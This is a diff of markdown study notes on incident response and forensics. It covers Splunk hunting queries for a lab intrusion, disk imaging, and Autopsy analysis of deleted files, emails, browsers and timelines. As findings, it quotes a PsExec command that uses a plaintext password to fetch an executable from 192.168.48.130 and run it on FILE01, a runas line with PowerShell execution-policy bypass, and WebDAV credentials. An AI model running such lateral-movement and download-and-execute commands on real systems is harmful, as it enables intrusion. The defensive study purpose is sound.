@@ -113,9 +113,7 @@ Uncover all events associated with the filenames `6.exe` and `432.lnk`, excludin
 
 Search for network communications to `webdav.4shared.com` and `cohodl.com` (from the identified username).
 
-```
-("webdav.4shared.com") or ("cohodl.com")
-```
+`("webdav.4shared.com") or ("cohodl.com")`
 
 Search for any instances of scheduled tasks with the names WindowsUpdate or UpdateHealthCheck across all systems, excluding CLIENT2.
 
@@ -127,9 +125,7 @@ Search for any instances of scheduled tasks with the names WindowsUpdate or Upda
 
 Hunt for events containing the username or password that were used in the authentication to the WebDAV share.
 
-```
-("lasex69621@cohodl.com") or ("dE}9tBDaFK'Y%uv")
-```
+`("lasex69621@cohodl.com") or ("dE}9tBDaFK'Y%uv")`
 
 # IR-200
 
@@ -143,11 +139,13 @@ Detect password spraying attacks
 
 `host="dc01" "EventCode=4625"`
 
-Check if the password spraying attempt was successful and valid credentials were identified, search for successful authentication requests with the event ID **4624**. 
+Check if the password spraying attempt was successful and valid credentials were identified, search for successful authentication requests with the event ID `4624`. 
 
-**Script Block Logging** records the input and output of script blocks executed in PowerShell. **Script Block Logging** events are collected in the index **windows_powershell**.
+**Script Block Logging** records the input and output of script blocks executed in PowerShell.
 
-Search for events related to password spraying => Commands or tools used to perform the attack if those actions were performed via PowerShell. 
+**Script Block Logging** events are collected in the index `windows_powershell`.
+
+Search for events related to password spraying (Commands or tools used to perform the attack if those actions were performed via PowerShell).
 
 `index="windows_powershell" host="CLIENT01"`
 
@@ -155,7 +153,7 @@ Well-known password spraying PowerShell script: `https://github.com/dafthack/Dom
 
 Reviewing the other events, discover an event with the ID **4100** with the user is ...
 
-Search the **Windows Defender Operational** log and the event ID 1116 which is used to record the detection of malware:
+Search the **Windows Defender Operational** log and the event ID `1116` which is used to record the detection of malware:
 
 `index="windows_defender" "EventCode=1116"`
 
@@ -163,15 +161,13 @@ Understand how the malicious binaries were transferred to the internal machines:
 
 `index="windows_sysmon" host="CLIENT01"`
 
-Since the scheduled task was identified by analyzing the PowerShell history, search the PowerShell Operational log that contains events recorded by **Script Block Logging**.
+Since the scheduled task was identified by analyzing the PowerShell history, search the **PowerShell Operational log** that contains events recorded by **Script Block Logging**.
 
 3 commands that can be used in PowerShell to create a scheduled task: `Register-ScheduledTask` Cmdlet, `schtasks.exe`, and `at.exe`.
 
 `index="windows_powershell" host="CLIENT01" ("Register-ScheduledTask" OR "schtasks.exe" OR "at.exe")`
 
-The post contained the filename `dump.db`. Since the database was dumped from a Confluence service, limit the potentially-infected systems to WEB01.
-
-Search for all events containing the string `*.db` for the host WEB01. If the database is exfiltrated without renaming, it should have this file extension.
+Search for all events containing the string `*.db` for the host WEB01.
 
 `host="web01" "*.db"`
 
@@ -179,19 +175,19 @@ Search query for the **ShellShock** alert. On host WEB01, the `other_vhosts_acce
 
 `host="web01" source="/var/log/apache2/other_vhosts_access.log" "*.cgi"`
 
-Search the index **windows_sysmon** for events containing the string Bloodhound on the host FILE01.
+Search the index **windows_sysmon** for events containing the string `Bloodhound` on the host FILE01.
 
 `index="windows_sysmon" host="FILE01" "BloodHound"`
 
-`:Zone.Identifier` at the end of the file name is metadata and used by the **Attachment Execution Service** in Windows, indicating where the file originated from. The main objective is to protect users from running malicious files downloaded from locations such as the internet.
+`:Zone.Identifier` at the end of the file name is metadata and used by the **Attachment Execution Service** in Windows, indicating where the file originated from. => to protect users from running malicious files downloaded from locations such as the internet.
 
 Find out who or in which user context the domain enumeration was performed.
 
-Search the **windows_powershell** index to find PowerShell commands or script blocks related to the SharpHound collector usage.
+Search the `windows_powershell` index to find PowerShell commands or script blocks related to the SharpHound collector usage.
 
 `index="windows_powershell" host="FILE01"`
 
-The event contains the information that runas was used to create a PowerShell session as domain user X. This explains why the local administrator account was recorded performing the domain enumeration:
+The event contains the information that `runas` was used to create a PowerShell session as domain user X. This explains why the local administrator account was recorded performing the domain enumeration:
 
 `runas /netonly /user:TECH\l.martin "powershell.exe -ep bypass"`
 
@@ -227,7 +223,7 @@ PsExec is used to move laterally to FILE01.
 .\PsExec64.exe -accepteula -i \\FILE01 -u TECH\SVCFILE01 -p "Querty09!" cmd /c powershell -Command "& {$client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.168.48.130/application_builder.exe', 'C:\Windows\Tasks\updater.exe'); Start-Process 'C:\Windows\Tasks\updater.exe'}"
 ```
 
-Windows Security log contains audit events. They are contained in the index **main**,
+Windows Security log contains audit events. They are contained in the index `main`:
 
 `index="main" host="FILE01"`
 
@@ -249,24 +245,187 @@ Using Kali Linux live in Forensics Mode to obtain a disk image from a victim mac
 
 ```bash
 sudo fdisk -l
+```
+
+```bash
 sudo mkdir /mnt/external
 sudo mount /dev/sda1 /mnt/external  
 ls -lsa /mnt/external
+
 sudo dd if=/dev/nvme0n1 of=/mnt/external/VICTIM-OS.raw bs=4M conv=sync,noerror status=progress
+```
+
+```bash
 sha256sum /mnt/external/VICTIM-OS.raw
 ```
 
 ### Computer Forensics (Autopsy)
 
+Documentation: https://sleuthkit.org/autopsy/docs/user-docs/4.21.0/index.html
+
 Perform analysis on disk images through ingest modules:
 
 - The **Discovery** feature is designed to quickly identify potential findings and interesting data that may not immediately apparent.
 
-- Use the ((timeline)) feature to better understand sequences of events as Autopsy aggregates a broad spectrum of activity based on timestamps. We can build timelines around particular points of interest such as file creation and review the events before and after an event.
+- Use the **timeline** feature to better understand sequences of events as Autopsy aggregates a broad spectrum of activity based on timestamps.
+
+Build timelines around particular points of interest such as **file creation** and review the events before and after an event.
 
 Use the timeline feature to review events around the creation of `dump.db`.
 
-Right-click the file and select **View File in Timeline....** For now, we are interested in **5 minutes before and after the file creation**. To view this, we'll select **File Created** and then Show Timeline.
+Right-click the file and select `View File in Timeline....` > `5 minutes before and after the file creation`. To view this, select `File Created` > `Show Timeline`.
+
+### Common File Analysis Techniques
+
+After creating the case, add a `Data Source` which will be the disk image. In the `Select Host` page, specify the **host name** corresponding to the machine where the disk image was collected.
+
+Choose `Generate new host name based on data source name` > Choose `Disk Image or VM File` as the data source type > click `Next`.
+
+Select the **disk image file** and leave the default setting for the rest of the options > Set the correct timezone > Click `Next` to continue.
+
+Choose the `Ingest Modules` used to analyze the disk image.
+
+An Autopsy ingest module processes data to analyze specific aspects of the evidence, like extracting metadata, identifying file types, or detecting specific artifacts.
+
+Click `Deselect All` and select the `PhotoRec Carver`. This module uses PhotoRec, a popular open-source file carving tool.
+
+**File carving** is the analysis of raw data, like disk images or memory dumps, to identify files by their signatures and formats.
+
+=> To recover **deleted files** from unallocated disk space that haven't been overwritten yet + recover files from corrupted file systems or discover **files hidden** by counter-forensic techniques.
+
+Select the `Hash Lookup` with its default settings. This module calculates hash values for files and looks up hash values in a database to determine if the file is notable or known.
+
+Click `Next` to add the data source to the local database > click `Finish`.
+
+See deleted files in the `Deleted Files` container.
+
+- Navigate to `Deleted Files > All Files` to find a list of recovered files.
+
+Click on any part of the `Listing` pane and search by filename. E.g. Search for `smart`:
+
+Looking for a `.docx` file. In the Tree pane navigate to `File Views -> File Types -> By Extension -> Documents -> Office`.
+
+Right-click on the item and select `Open in External Viewer` to open the file with the default application associated with the file extension.
+
+Select the file again and go to the `File Metadata` tab of the bottom pane to take note of its **MD5 and SHA-256 hashes** values for documentation.
+
+Take note of the **file path** `/img_malice_case_pc.E01/vol_vol2/$CarvedFiles/1/`.
+
+Right-click on the file and select `Extract File(s)`. By default, Autopsy will place them in the `Export` folder.
+
+```pwsh
+ExifTool.exe C:\Export\f0236920.docx
+```
+
+If we're unable to fully recover a file, perhaps because it has been overwritten or is corrupted => retrieve parts of the file with **data carving**, which tries to reassemble files from raw data fragments when no file system metadata is available.
+
+Some data carving methods use entropy analysis to predict file format by identifying patterns specific to certain formats.
+
+**Bulk Extractor** is a popular open source stream carving tool.
+
+Although Autopsy doesn't support stream carving, use the `Keyword Search` module to search for specific data within the data source.
+
+Add a custom keyword list for this case. In the upper menu select the `Keyword Lists` tab and click `Manage Lists`. Add a new list which we'll name `smartspoon` and we'll add 3 keywords: `smartspoon, smart, and spoon`. If we try to run the search at this point, we'll get an error message indicating that `No files were indexed`.
+
+**File indexing** is done by running the `Keyword Search` ingest module.
+
+To run a new ingest module, navigate to `Tools -> Run Ingest Modules` and select the case. But this will run the module against the entire image, which will take hours to complete.
+
+=> Run ingest modules against **specific directories**.
+
+Select the `$CarvedFiles/1/` folder and right-click to select `Run Ingest Modules`.
+
+Monitor the `Analysis Results -> Keyword Hits` pane for our results.
+
+### Email Forensics
+
+To analyze emails associated with the case, run the `Email Parser` module to identify and parse emails from the disk image.
+
+Navigate to the `Tools -> Run Ingest Modules` and select the case > Enable the `Email Parser` module and click `Finish` to start the analysis.
+
+The findings will appear in the `Data Artifacts` container in the left pane.
+We can find a list of extracted email addresses in `Communication Accounts -> Email`:
+
+Microsoft Outlook stores emails in the proprietary Outlook Data File format, saved as either `.pst` or `.ost` files.
+
+Users can choose the location of these files but by default, they are stored in the `%USERPROFILE%\AppData\Local\Microsoft\Outlook\` folder.
+
+Browse and select one of the email accounts > browse more information in the `Data Artifacts` tab in the bottom pane.
+
+- The `Source File Path` indicates the location of the email. E.g. `C:\Users\vonmalice\AppData\Local\Microsoft\Outlook\vonmalice42@outlook.com.ost` file.
+
+Browse the email list by navigating to `Data Artifacts -> Email Messages -> Default`. "Default" refers to the default email account in the email client.
+
+- The `Path` column lists the email's location in the mailbox's IPM Subtree. This is an organizational container which typically contains the `Inbox, Sent Items, and Deleted Items`.
+
+- After selecting an email from the list we can read its content in the `Data Artifacts` tab of the bottom pane.
+
+Retrieve the **email headers** of one of the received emails.
+
+- In the left pane navigate to the `Email Messages -> Default` section to display the list of emails in the right pane > select the email > in the bottom pane view the `Data Artifacts` section and select the `Headers` tab to view the email headers.
+
+### Browser Forensics
+
+| Browser | File System Location | File Format |
+| ------- | -------------------- | ----------- |
+| Chrome  |	%USERPROFILE%\AppData\Local\Google\Chrome\User Data\ | SQLite, json |
+| Edge    |	%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\ |	SQLite, json |
+| Firefox |	%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\<profile> | SQLite, json |
+
+Go to their default locations to extract the data. Use a tool that can parse SQLite databases, along with some knowledge of SQL and the database schema to extract information relevant to the case.
+
+Extract artifacts relevant to **internet activity**.
+
+Run the `Recent Activity` module which will extract artifacts related to user activity on the device.
+
+In the `Web Bookmarks` section find a list of URLs that the user has saved as browser bookmarks.
+
+- Looking at the list, we can see that there are 3 different **data sources** for the bookmarks.
+
+- Each source corresponds to a different browser as shown in the `Program Name` column.
+
+- The `Source File Metadata` tab in the bottom pane shows the location of the data sources in the disk image.
+
+The `Browsing History` provides a list of URLs visited by the user along with the date and time and how many times they were visited.
+ 
+- 2 different data sources => 2 different browsers.
+
+Autopsy also extracts 2 more artifacts from the same data source, showing them in the `Web Downloads` and `Web Search` sections.
+
+Select `Web Cookies` to explore the list of cookies identified during the analysis.
+ 
+- The value of the cookies couldn't be extracted from the Microsoft Edge browser. Chromium-based browsers like Edge **encrypt** this data.
+
+The `Web Cache` is a temporary storage location where the browser stores static content (i.e. images and HTML files) of the visited websites to speed up the loading time when the user visits the same website again.
+
+=> Reveals valuable information about user behavior, including the pages they visited and the content they viewed.
+
+If we are investigating an incident caused by a phishing attack, look at the browsing history to determine if the user visited a malicious website and downloaded malware.
+
+If we are investigating a fraud case, look at the cookies to see if the user not only browsed a site but was logged into it when he claimed he wasn't.
+
+### Timeline Analysis of User’s Activity
+
+Run the `Recent Activity` ingest module. This ensures Autopsy loads the **timestamps** of user activity events.
+
+This feature uses the `Plaso` ingest module. Plaso (formerly known as `log2timeline`), an open-source tool that extracts timestamps from various sources and presents them in a unified view. Plaso can be run as a standalone tool, but also through Autopsy.
+
+Launch the `Plaso` ingest module against case, leaving all the default options set.
+
+Open the `Timeline` analysis from the top menu.
+
+- Search for specific keywords in the events.
+- Filter by date, time, and event type.
+
+Choose the `Limit event types to` option and select only the `Web Activity` and `Other events`.
+
+In `Web Activity` disable the `Web Cache` and `Web Cookies` events.
+
+In Other only enable `Document Created, Document Last Printed, Document Last Saved, Email Received, Email Sent, and Recent Document`.
+
+Click `Apply`
+
+Choose the `List` view from the top buttons to see the events in a list format.
 
 ### Memory Forensics (Volatility)
 
